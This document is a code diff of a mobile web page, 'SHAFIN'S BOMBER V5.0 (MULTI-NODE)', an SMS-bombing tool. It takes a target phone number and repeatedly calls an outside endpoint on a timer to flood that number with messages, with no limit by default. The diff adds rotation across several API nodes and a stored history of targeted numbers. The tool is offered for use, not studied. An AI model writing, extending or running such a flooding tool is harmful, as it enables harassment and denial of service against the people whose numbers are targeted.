@@ -4,7 +4,7 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
   <meta name="theme-color" content="#000000">
-  <title>SHAFIN'S BOMBER V3.16.7 MOBILE</title>
+  <title>SHAFIN'S BOMBER V5.0 (MULTI-NODE)</title>
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
 
   <style>
@@ -13,8 +13,8 @@
       --dim: #008F11;
       --alert: #ff3333;
       --bg: #050505;
-      --panel: rgba(0, 10, 0, 0.85);
-      --glass: blur(4px);
+      --panel: rgba(0, 10, 0, 0.95);
+      --glass: blur(5px);
     }
 
     * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
@@ -53,6 +53,7 @@
       border-left: 1px solid #003300;
       border-right: 1px solid #003300;
       box-shadow: 0 0 20px rgba(0,255,65,0.1);
+      position: relative;
     }
 
     /* Header */
@@ -62,23 +63,26 @@
       border-bottom: 1px solid var(--dim);
       text-align: center;
       flex-shrink: 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
     }
     .title {
-      font-size: 1.2rem;
-      letter-spacing: 2px;
+      font-size: 1.1rem;
+      letter-spacing: 1px;
       text-shadow: 0 0 5px var(--primary);
       margin: 0;
     }
-    .status {
-      font-size: 0.7rem;
-      color: var(--dim);
-      margin-top: 5px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 5px;
+    .db-btn {
+        background: transparent;
+        border: 1px solid var(--dim);
+        color: var(--dim);
+        padding: 5px 10px;
+        font-family: inherit;
+        font-size: 0.8rem;
+        cursor: pointer;
     }
-    .status span { color: var(--alert); animation: blink 1s infinite; }
+    .db-btn:active { background: var(--dim); color: #000; }
 
     /* Scrollable Content */
     .content-scroll {
@@ -112,6 +116,18 @@
       text-align: right;
     }
 
+    /* Stats Bar */
+    .stats-bar {
+        display: flex;
+        justify-content: space-between;
+        background: #001100;
+        padding: 5px 10px;
+        font-size: 0.8rem;
+        border: 1px solid var(--dim);
+        margin-bottom: 5px;
+    }
+    .stat-box span { color: #fff; font-weight: bold; }
+
     /* Controls */
     .controls { display: flex; flex-direction: column; gap: 15px; }
     
@@ -141,7 +157,6 @@
       box-shadow: 0 0 10px rgba(0,255,65,0.2);
       background: rgba(0, 30, 0, 0.8);
     }
-    input::placeholder { color: #004400; }
 
     /* Buttons */
     .btn-row { display: flex; gap: 10px; margin-top: 5px; }
@@ -156,8 +171,6 @@
       cursor: pointer;
       border: none;
       border-radius: 2px;
-      position: relative;
-      overflow: hidden;
     }
 
     .btn-start {
@@ -190,27 +203,65 @@
     .log-sys { color: #ffff00; border-color: #ffff00; }
     .log-sent { color: #aaffaa; border-color: var(--primary); }
     .log-err { color: var(--alert); border-color: var(--alert); }
+    .log-node { color: #00ffff; border-color: #00ffff; }
 
-    /* Stats Display */
-    .stats-bar {
+    /* --- HISTORY MODAL --- */
+    #historyPanel {
+        position: absolute;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(0,0,0,0.95);
+        z-index: 100;
+        display: none;
+        flex-direction: column;
+        padding: 20px;
+    }
+    #historyPanel.active { display: flex; }
+    
+    .history-header {
         display: flex;
         justify-content: space-between;
-        background: #001100;
-        padding: 5px 10px;
-        font-size: 0.8rem;
-        border: 1px solid var(--dim);
-        margin-bottom: 5px;
+        border-bottom: 2px solid var(--primary);
+        padding-bottom: 10px;
+        margin-bottom: 10px;
     }
-    .stat-box span { color: #fff; font-weight: bold; }
-
-    @keyframes blink { 50% { opacity: 0; } }
+    .close-btn { 
+        background: var(--alert); color: #000; border: none; padding: 5px 15px; 
+        font-weight: bold; font-family: inherit;
+    }
     
+    .history-list {
+        flex: 1;
+        overflow-y: auto;
+        border: 1px solid #333;
+    }
+    
+    .history-item {
+        padding: 15px;
+        border-bottom: 1px solid #222;
+        color: #fff;
+        display: flex;
+        justify-content: space-between;
+        cursor: pointer;
+    }
+    .history-item:active { background: #111; }
+    .history-item span { color: var(--dim); font-size: 0.8rem; }
+    .history-item strong { color: var(--primary); font-size: 1.1rem; }
+
+    .clear-btn {
+        margin-top: 10px;
+        padding: 15px;
+        background: transparent;
+        border: 1px solid #555;
+        color: #888;
+        width: 100%;
+        font-family: inherit;
+    }
+
     /* Fix for small phones */
     @media (max-height: 600px) {
       .visuals { height: 100px; }
       canvas#radar { width: 100px; height: 100px; }
       .terminal { height: 80px; }
-      .header { padding: 10px; }
     }
   </style>
 </head>
@@ -219,36 +270,34 @@
 <canvas id="matrix"></canvas>
 
 <div class="app-container">
+  <!-- Header with Database Button -->
   <div class="header">
-    <h1 class="title" id="typewriter"></h1>
-    <div class="status"><span>●</span> ENCRYPTED CONNECTION</div>
+    <button class="db-btn" id="dbBtn">DB</button>
+    <h1 class="title">SHAFIN V5 (MULTI)</h1>
+    <div style="font-size:0.7rem; color:var(--dim);">NODES: <span id="nodeCount">1</span></div>
   </div>
 
   <div class="content-scroll">
-    <!-- Radar Visualization -->
     <div class="visuals">
       <canvas id="radar" width="200" height="200"></canvas>
       <div class="geo-overlay" id="geo-info">
-        TARGET: UNKNOWN<br>
-        LOCATING...
+        TARGET: UNKNOWN<br>LOCATING...
       </div>
     </div>
 
-    <!-- Stats Bar -->
     <div class="stats-bar">
         <div class="stat-box">SENT: <span id="sentCount">0</span></div>
         <div class="stat-box">LIMIT: <span id="limitCount">∞</span></div>
     </div>
 
-    <!-- Inputs -->
     <div class="controls">
       <div class="input-group">
-        <label>TARGET NUMBER (11 DIGIT)</label>
-        <input id="phone" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="017XXXXXXXX" maxlength="11" />
+        <label>TARGET NUMBER</label>
+        <input id="phone" type="tel" inputmode="numeric" placeholder="017XXXXXXXX" maxlength="11" />
       </div>
 
       <div class="input-group">
-        <label>AMOUNT (OPTIONAL)</label>
+        <label>AMOUNT</label>
         <input id="amount" type="number" inputmode="numeric" placeholder="Unlimited" />
       </div>
 
@@ -264,9 +313,20 @@
     </div>
   </div>
 
-  <!-- Console Log -->
   <div class="terminal" id="console">
-    <div class="log-line log-sys">> SYSTEM READY. WAITING FOR INPUT...</div>
+    <div class="log-line log-sys">> SYSTEM READY. NODES LOADED.</div>
+  </div>
+
+  <!-- History Panel Modal -->
+  <div id="historyPanel">
+      <div class="history-header">
+          <span style="font-size:1.2rem; margin-top:5px;">TARGET LOGS</span>
+          <button class="close-btn" id="closeDb">X</button>
+      </div>
+      <div class="history-list" id="historyList">
+          <!-- Items will be injected here -->
+      </div>
+      <button class="clear-btn" id="clearDb">CLEAR DATABASE</button>
   </div>
 </div>
 
@@ -278,6 +338,19 @@ let packetsSent = 0;
 let packetLimit = 0;
 const PROTECTED_NUMS = ["01317087493"]; 
 
+// --- API NODES (Add more here) ---
+// Structure: A function that takes 'num' and returns the full URL
+const apiNodes = [
+    // Node 1: Primary
+    (num) => `https://bj-x-coder.top/bo_m_ber.php?phone=${num}&amount=1`,
+    
+    // Node 2: Example/Placeholder (Replace with valid API)
+    // (num) => `https://example-sms.com/api.php?target=${num}`,
+    
+    // Node 3: Another Placeholder
+    // (num) => `https://another-api.net/sms?number=${num}`,
+];
+
 // --- DOM ELEMENTS ---
 const ui = {
   phone: document.getElementById('phone'),
@@ -286,26 +359,71 @@ const ui = {
   console: document.getElementById('console'),
   startBtn: document.getElementById('startBtn'),
   stopBtn: document.getElementById('stopBtn'),
-  geoInfo: document.getElementById('geo-info'),
-  title: document.getElementById('typewriter'),
   sentDisplay: document.getElementById('sentCount'),
-  limitDisplay: document.getElementById('limitCount')
+  limitDisplay: document.getElementById('limitCount'),
+  nodeCountDisplay: document.getElementById('nodeCount'),
+  // History UI
+  dbBtn: document.getElementById('dbBtn'),
+  historyPanel: document.getElementById('historyPanel'),
+  historyList: document.getElementById('historyList'),
+  closeDb: document.getElementById('closeDb'),
+  clearDb: document.getElementById('clearDb')
 };
 
 // --- INITIALIZATION ---
 window.addEventListener('DOMContentLoaded', () => {
-  const savedPhone = localStorage.getItem('shafin_target');
-  if(savedPhone) {
-    ui.phone.value = savedPhone;
-    log(`Restored Session: ${savedPhone}`, 'sys');
-  }
-  typewriterEffect("SHAFIN'S BOMBER V3.16.7");
+  const lastPhone = localStorage.getItem('shafin_last_target');
+  if(lastPhone) ui.phone.value = lastPhone;
+  
+  ui.nodeCountDisplay.innerText = apiNodes.length; // Show active nodes
+  
   resizeMatrix();
   animateRadar();
   matrixLoop();
 });
 
 window.addEventListener('resize', resizeMatrix);
+
+// --- HISTORY SYSTEM ---
+function saveToHistory(phone) {
+    let history = JSON.parse(localStorage.getItem('shafin_history') || "[]");
+    history = history.filter(item => item.phone !== phone);
+    const timestamp = new Date().toLocaleDateString() + " " + new Date().toLocaleTimeString();
+    history.unshift({ phone: phone, time: timestamp });
+    if(history.length > 20) history.pop();
+    localStorage.setItem('shafin_history', JSON.stringify(history));
+    localStorage.setItem('shafin_last_target', phone);
+}
+
+function renderHistory() {
+    const history = JSON.parse(localStorage.getItem('shafin_history') || "[]");
+    ui.historyList.innerHTML = "";
+    if(history.length === 0) {
+        ui.historyList.innerHTML = "<div style='padding:20px; color:#555;'>NO DATA FOUND</div>";
+        return;
+    }
+    history.forEach(item => {
+        const div = document.createElement('div');
+        div.className = 'history-item';
+        div.innerHTML = `<strong>${item.phone}</strong><span>${item.time}</span>`;
+        div.onclick = () => {
+            ui.phone.value = item.phone;
+            ui.historyPanel.classList.remove('active');
+            log(`Loaded from DB: ${item.phone}`, 'sys');
+        };
+        ui.historyList.appendChild(div);
+    });
+}
+
+// History Event Listeners
+ui.dbBtn.onclick = () => { renderHistory(); ui.historyPanel.classList.add('active'); };
+ui.closeDb.onclick = () => { ui.historyPanel.classList.remove('active'); };
+ui.clearDb.onclick = () => {
+    if(confirm("Clear all history?")) {
+        localStorage.removeItem('shafin_history');
+        renderHistory();
+    }
+};
 
 // --- UTILITIES ---
 function log(msg, type = 'sent') {
@@ -315,75 +433,54 @@ function log(msg, type = 'sent') {
   div.innerHTML = `[${time}] ${msg}`;
   ui.console.appendChild(div);
   ui.console.scrollTop = ui.console.scrollHeight;
-  
   if(ui.console.childElementCount > 50) ui.console.removeChild(ui.console.firstChild);
 }
 
-function typewriterEffect(text, i = 0) {
-  if (i < text.length) {
-    ui.title.innerHTML += text.charAt(i);
-    setTimeout(() => typewriterEffect(text, i + 1), 50);
-  }
-}
-
-function vibrate(pattern) {
-  if (navigator.vibrate) navigator.vibrate(pattern);
-}
+function vibrate(pattern) { if (navigator.vibrate) navigator.vibrate(pattern); }
 
 // --- ATTACK LOGIC ---
 ui.startBtn.addEventListener('click', () => {
   let phone = ui.phone.value.replace(/[^0-9]/g, '');
   const speed = parseInt(ui.speed.value) || 1500;
-  packetLimit = parseInt(ui.amount.value) || 0; // 0 means unlimited
+  packetLimit = parseInt(ui.amount.value) || 0; 
 
-  // Security Checks
   if (PROTECTED_NUMS.includes(phone)) {
-    log('ACCESS DENIED: SHAFIN PROTOCOL', 'err');
-    vibrate([50, 50, 50, 50, 200]);
-    alert("SYSTEM WARNING: Target is protected.");
+    log('ACCESS DENIED', 'err');
+    vibrate(200);
+    alert("Protected Number.");
     return;
   }
 
   if(phone.length < 11) {
-    log('ERROR: INVALID MSISDN LENGTH', 'err');
+    log('ERROR: Invalid Number', 'err');
     vibrate(200);
     return;
   }
 
-  // Save State
-  localStorage.setItem('shafin_target', phone);
+  saveToHistory(phone);
 
-  // UI Update
   isRunning = true;
   packetsSent = 0;
   ui.sentDisplay.innerText = "0";
   ui.limitDisplay.innerText = packetLimit > 0 ? packetLimit : "∞";
   
   ui.startBtn.disabled = true;
-  ui.startBtn.innerText = "ATTACKING...";
+  ui.startBtn.innerText = "RUNNING...";
   ui.phone.disabled = true;
   log(`TARGET LOCKED: ${phone}`, 'sys');
   vibrate(100);
 
-  // Attack Loop
   attackTimer = setInterval(() => {
     if(!isRunning) return;
-    
-    // Check limit
     if(packetLimit > 0 && packetsSent >= packetLimit) {
-      stopAttack("PACKET LIMIT REACHED");
+      stopAttack("LIMIT REACHED");
       return;
     }
-
     sendPacket(phone);
-    updateGeoData();
-
   }, speed);
 });
 
-ui.stopBtn.addEventListener('click', () => {
-  if(isRunning) stopAttack("MANUAL ABORT");
-});
+ui.stopBtn.addEventListener('click', () => { if(isRunning) stopAttack("ABORTED"); });
 
 function stopAttack(reason) {
   isRunning = false;
@@ -395,40 +492,31 @@ function stopAttack(reason) {
   vibrate(500);
 }
 
+// --- MULTI-NODE SENDER ---
 async function sendPacket(phone) {
-  const url = `https://bj-x-coder.top/bo_m_ber.php?phone=${phone}&amount=1`;
-  
-  // Try sending request
+  // Randomly select an API Node
+  const nodeIndex = Math.floor(Math.random() * apiNodes.length);
+  const getUrl = apiNodes[nodeIndex]; // This is the function
+  const url = getUrl(phone); // Generate URL with phone number
+
   try {
-    // We initiate the fetch. 
-    // Note: Due to 'no-cors', we cannot verify if the server *successfully* sent the SMS (200 OK) or failed (500 Error).
-    // However, this code will only increment if the browser successfully *dispatched* the request.
     await fetch(url, { mode: 'no-cors' }); 
-    
-    // Increment ONLY after the fetch is dispatched
     packetsSent++;
     ui.sentDisplay.innerText = packetsSent;
-    log(`>> Request ${packetsSent} sent`);
-    
+    log(`>> [NODE-${nodeIndex+1}] Request Sent`);
   } catch (e) {
-    // If there is a network error (e.g. no internet), we do NOT increment
-    log(`Network Fail: ${e.message}`, 'err');
+    log(`[NODE-${nodeIndex+1}] Fail`, 'err');
   }
 }
 
-// --- VISUALIZATION: RADAR ---
+// --- VISUALIZATION: RADAR & MATRIX ---
 const rCanvas = document.getElementById('radar');
 const rCtx = rCanvas.getContext('2d');
 let radarAngle = 0;
 
 function animateRadar() {
-  const w = rCanvas.width;
-  const h = rCanvas.height;
-  const cx = w/2, cy = h/2;
-  
+  const w = rCanvas.width, h = rCanvas.height, cx = w/2, cy = h/2;
   rCtx.clearRect(0,0,w,h);
-  
-  // Static Rings
   rCtx.strokeStyle = 'rgba(0, 50, 0, 0.5)';
   rCtx.lineWidth = 1;
   rCtx.beginPath();
@@ -437,42 +525,26 @@ function animateRadar() {
   rCtx.arc(cx, cy, w*0.48, 0, Math.PI*2);
   rCtx.stroke();
   
-  // Rotating Sweep
   rCtx.save();
   rCtx.translate(cx, cy);
   rCtx.rotate(radarAngle);
-  
   const grad = rCtx.createLinearGradient(0, 0, w*0.5, 0);
   grad.addColorStop(0, 'rgba(0, 255, 65, 0)');
   grad.addColorStop(1, 'rgba(0, 255, 65, 0.5)');
-  
   rCtx.fillStyle = grad;
-  rCtx.beginPath();
-  rCtx.moveTo(0,0);
-  rCtx.arc(0, 0, w*0.48, -0.2, 0.2); 
-  rCtx.fill();
+  rCtx.beginPath(); rCtx.moveTo(0,0); rCtx.arc(0, 0, w*0.48, -0.2, 0.2); rCtx.fill();
   rCtx.restore();
 
-  // Random Blips
   if(isRunning && Math.random() > 0.92) {
     const dist = (Math.random() * (w*0.4));
     const ang = Math.random() * Math.PI * 2;
-    const x = cx + Math.cos(ang) * dist;
-    const y = cy + Math.sin(ang) * dist;
     rCtx.fillStyle = '#ff3333';
-    rCtx.fillRect(x, y, 3, 3);
+    rCtx.fillRect(cx + Math.cos(ang) * dist, cy + Math.sin(ang) * dist, 3, 3);
   }
-
   radarAngle += 0.05;
   requestAnimationFrame(animateRadar);
 }
 
-function updateGeoData() {
-  const ip = `103.20.${Math.floor(Math.random()*99)}.${Math.floor(Math.random()*255)}`;
-  ui.geoInfo.innerHTML = `IP: ${ip}<br>LAT: 23.${Math.floor(Math.random()*999)}<br>LNG: 90.${Math.floor(Math.random()*999)}`;
-}
-
-// --- VISUALIZATION: MATRIX ---
 const mC = document.getElementById("matrix");
 const mCtx = mC.getContext("2d");
 let drops = [];
@@ -487,23 +559,15 @@ function resizeMatrix() {
 function matrixLoop() {
   mCtx.fillStyle = "rgba(0, 0, 0, 0.1)"; 
   mCtx.fillRect(0, 0, mC.width, mC.height);
-  
   mCtx.fillStyle = "#0f3"; 
   mCtx.font = "16px monospace";
-  
   drops.forEach((y, i) => {
-    const text = charSet[Math.floor(Math.random() * charSet.length)];
-    mCtx.fillText(text, i * 20, y * 20);
-    
-    if (y * 20 > mC.height && Math.random() > 0.98) {
-      drops[i] = 0;
-    }
+    mCtx.fillText(charSet[Math.floor(Math.random() * charSet.length)], i * 20, y * 20);
+    if (y * 20 > mC.height && Math.random() > 0.98) drops[i] = 0;
     drops[i]++;
   });
-  
   requestAnimationFrame(matrixLoop);
 }
-
 </script>
 </body>
 </html>
